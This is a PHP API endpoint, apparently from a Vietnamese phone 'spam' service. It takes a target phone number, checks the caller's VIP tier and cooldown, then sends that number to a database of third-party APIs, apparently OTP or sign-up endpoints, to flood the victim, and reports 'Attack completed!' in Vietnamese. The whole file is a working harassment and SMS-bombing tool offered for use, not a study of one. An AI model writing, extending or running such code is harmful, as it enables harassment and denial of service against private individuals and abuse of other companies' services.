<?php
header('Content-Type: application/json');
require_once dirname(__DIR__).'/includes/config.php';
require_once dirname(__DIR__).'/includes/functions.php';

// Check API Key or Session
$auth_ok = false;
$user = null;

if (isset($_SESSION['user_id'])) {
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->execute([$_SESSION['user_id']]);
    $user = $stmt->fetch();
    if ($user) $auth_ok = true;
}

if (!$auth_ok) {
    echo json_encode(['status' => 'error', 'message' => 'Unauthorized']);
    exit;
}

$phone = $_POST['phone'] ?? $_GET['phone'] ?? '';
if (!preg_match('/^0[0-9]{9}$/', $phone)) {
    echo json_encode(['status' => 'error', 'message' => 'Số điện thoại không hợp lệ (10 số, bắt đầu bằng 0)']);
    exit;
}

// Check whitelist
$stmt = $pdo->prepare("SELECT id FROM whitelist WHERE phone_number = ?");
$stmt->execute([$phone]);
if ($stmt->fetch()) {
    echo json_encode(['status' => 'error', 'message' => 'Số điện thoại này nằm trong danh sách trắng (Whitelist)!']);
    exit;
}

// Logic spam: Fetch allowed APIs and execute
$cooldown = isset($user['cooldown']) ? intval($user['cooldown']) : 300;
$api_limit = isset($user['api_limit']) ? intval($user['api_limit']) : 1;
$user_levels = explode(',', ($user['vip_level'] ?? 'normal'));

if ($user['role'] == 'admin') {
    $user_levels = ['normal', 'vip', 'forever'];
    $cooldown = 0; 
    $api_limit = 100;
} elseif (!$user['is_vip']) {
    $user_levels = ['normal'];
}

// Check Cooldown
$now = time();
if ($user['role'] != 'admin' && ($now - ($user['last_spam'] ?? 0)) < $cooldown) {
    $wait = $cooldown - ($now - $user['last_spam']);
    echo json_encode(['status' => 'error', 'message' => "Bạn đang trong thời gian chờ (còn $wait giây)!"]);
    exit;
}

// Update Stats & Log
$pdo->prepare("UPDATE users SET last_spam = ?, daily_hits = daily_hits + 1 WHERE id = ?")
    ->execute([$now, $user['id']]);

$pdo->prepare("INSERT INTO logs (user_id, target, status) VALUES (?, 'SPAM', ?)")
    ->execute([$user['id'], "Khởi tạo spam qua API tới: $phone"]);

// Fetch APIs
$stmt = $pdo->prepare("SELECT * FROM apis WHERE status = 'on' ORDER BY rand()");
$stmt->execute();
$all_apis = $stmt->fetchAll();

$results = [];
$success_count = 0;
$run_count = 0;

foreach ($all_apis as $api) {
    if ($run_count >= $api_limit) break;
    
    $api_lvls = explode(',', $api['level']);
    if (array_intersect($api_lvls, $user_levels)) {
        $run_count++;
        $finalUrl = str_replace('{{phone}}', $phone, $api['url']);
        $finalBody = str_replace('{{phone}}', $phone, $api['body'] ?? '');
        $res = sendRequest($finalUrl, $api['method'], $api['headers'], $finalBody);
        
        $results[] = [
            'name' => $api['name'],
            'status' => 'success'
        ];
        $success_count++;
    }
}

echo json_encode([
    'status' => 'ok',
    'message' => 'Tấn công hoàn tất!',
    'data' => [
        'target' => $phone,
        'total_sent' => $success_count,
        'results' => $results
    ]
]);
